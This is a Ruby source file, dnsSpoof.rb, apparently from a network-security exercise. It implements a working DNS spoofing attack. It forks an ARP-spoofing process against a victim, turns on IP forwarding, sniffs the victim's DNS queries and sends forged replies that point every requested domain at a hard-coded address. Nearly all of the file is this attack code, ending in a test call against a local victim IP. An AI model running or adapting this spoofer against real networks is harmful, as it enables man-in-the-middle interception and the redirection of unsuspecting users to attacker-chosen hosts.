=begin
 File: dnsSpoof.rb
 Author: Luke Queenan
=end

# Gems
require 'rubygems'
require 'packetfu'

# Files
require './arpSpoof.rb'

# Includes so we don't have to use fully qualified class names
include PacketFu

=begin
 
=end
class DnsSpoof
    
    # Initialize the variables and information
    def initialize (routerIP, victimIP, interface)
        
        # Check for values
        if routerIP == nil || victimIP == nil || interface == nil
            fatalError("Usage: routerIP victimIP interface\n")
        end
        
        # Store global info
        @routerIP = routerIP
        @victimIP = victimIP
        @interface = interface
        
        # Get the MAC address of the router
        @routerMAC = Utils.arp(routerIP, :iface => @interface)
        if @routerMAC == nil
            fatalError("Unable to get router MAC")
        end
        
        # Get the MAC address of the victim
        @victimMAC = Utils.arp(victimIP, :iface => @interface)
        if @victimMAC == nil
            fatalError("Unable to get victim MAC")
        end
        
        # Get our information
        # TODO: CHANGE THIS TO ifconfig?
        @ourInfo = Utils.whoami?(:iface => interface)
        
        # Enable IP forwarding based on the OS (Linux or OS X)
        DnsSpoof.forward(true);
    end
    
    def main
        
        # Create the ARP Spoofing process
        @pid = fork do
            # Ensure that we shut down the child cleanly
            Signal.trap("INT") { DnsSpoof.forward(false); exit }
            arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                               @interface, @ourInfo)
            arp.main
        end
        
        # Make sure we shut down cleanly
        Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
        
        # Start DNS portion of program
        sniffPackets
        
    end

private    
    
    def sniffPackets
        
        # Start the capture process
        filter = "udp and port 53 and src " + @victimIP
        puts filter
        capture = Capture.new(:iface => @interface, :start => true,
                                        :promisc => true,
                                        :filter => filter,
                                        :save => true)
        
        # Find the DNS packets
        capture.stream.each do |pkt|
            puts "got packet\n"
            if UDPPacket.can_parse?(pkt)
                puts "Can parse\n"
                packet = Packet.parse(pkt)
                
                # Check for the platform before using to_s
                dnsQuery = packet.payload[2].to_s + packet.payload[3].to_s
                
                # Make sure we have a query packet
                if dnsQuery == '10'
                    domainName = getDomainName(packet.payload[12..-1])
                    
                    if domainName == nil
                        next
                    end
                    
                    puts "DNS request for: " + domainName
                    
                    sendResponse(packet, domainName)
                end
            end
        end
    end
    
    def sendResponse(packet, domainName)
        
        # Convert the IP address
        tester = "69.171.234.21"
        myIP = tester.split(".");
        #myIP = @ourInfo[:ip_saddr].split(".")
        myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
        
        # Create the UDP packet
        response = UDPPacket.new(:config => @ourInfo)
        response.udp_src = packet.udp_dst
        response.udp_dst = packet.udp_src
        response.ip_saddr = packet.ip_daddr
        response.ip_daddr = @victimIP
        response.eth_daddr = @victimMAC
        
        # Transaction ID
        response.payload = packet.payload[0,2]
        
        response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
        
        # Domain name
        domainName.split(".").each do |section|
            response.payload += section.length.chr
            response.payload += section
        end

        # Set more default values...........
        response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
        response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
        
        # IP
        response.payload += myIP2
        
        # Calculate the packet
        response.recalc
        
        # Send the packet out
        response.to_w(@interface)
        puts "\nsent packet out\n"
        
    end
    
    def getDomainName(rawDomain)
        domainName = ""
        
        while true
            
            # Get the length of the next section of the domain name
            length = rawDomain[0].to_i
            
            if length == 0
                # We have all the sections, so send it back
                return domainName = domainName[0, domainName.length - 1]
            elsif length != 0
                # Copy the section of the domain name over, kinda like casting :)
                domainName += rawDomain[1, length] + "."
                rawDomain = rawDomain[length + 1..-1]
            else
                # Malformed packet!
                return nil
            end
        end
    end

    # Function for enabling packet forwarding based on OS type (OS X and Linux)
    def DnsSpoof.forward(forward)
        
        if RUBY_PLATFORM =~ /darwin/
            if forward then
                `sysctl -w net.inet.ip.forwarding=1`
            end
            
            if !forward then
                `sysctl -w net.inet.ip.forwarding=0`
            end
        else
            if forward then
                `echo 1 > /proc/sys/net/ipv4/ip_forward`
            end
            
            if !forward then
                `echo 0 > /proc/sys/net/ipv4/ip_forward`
            end
        end
    end
    
    # Function for displaying an error message to the screen and then exiting
    def fatalError(message)
        puts message
        exit
    end
end

def test
    spoof = DnsSpoof.new("192.168.1.1", "192.168.1.115", "en0")
    spoof.main
end

test
#spoof = DnsSpoof.new(ARGV[0], ARGV[1], ARGV[2])
#spoof.main
